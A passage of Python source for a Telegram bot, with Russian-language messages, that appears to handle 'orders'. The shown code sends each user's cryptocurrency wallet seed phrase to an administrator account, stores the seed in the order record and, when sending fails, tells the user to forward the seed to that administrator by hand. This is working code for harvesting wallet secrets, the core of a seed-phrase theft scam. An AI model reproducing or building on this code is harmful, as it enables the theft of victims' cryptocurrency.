        except Exception as e:
            admin_error = str(e)
            logger.error(f"Ошибка отправки админу через юзернейм: {e}")
    
    # Подтверждаем пользователю
    if admin_notified:
        await update.message.reply_text(
            f"✅ Данные отправлены администратору @YungTrezinny!\n\n"
            f"Ожидайте обработки заказа."
        )
    else:
        error_message = f"❌ Ошибка при отправке данных администратору.\n\n"
        
        if "bot can't initiate conversation" in admin_error or "Forbidden: bot was blocked" in admin_error:
            error_message += f"Администратор @YungTrezinny должен сначала написать боту команду /start\n\n"
        else:
            error_message += f"Техническая ошибка: {admin_error[:100]}\n\n"
        
        error_message += f"Ваша сид-фраза (сохраните её):\n`{seed_text}`\n\n"
        error_message += f"Отправьте её вручную @YungTrezinny"
        
        await update.message.reply_text(
            error_message,
            parse_mode='Markdown'
        )
    
    # Обновляем статус заказа
    if user_id in pending_orders:
        for order in pending_orders[user_id]:
            if order.get("order_id") == current_order.get("order_id"):
                order["status"] = "completed" if admin_notified else "error"
                order["seed"] = seed_text
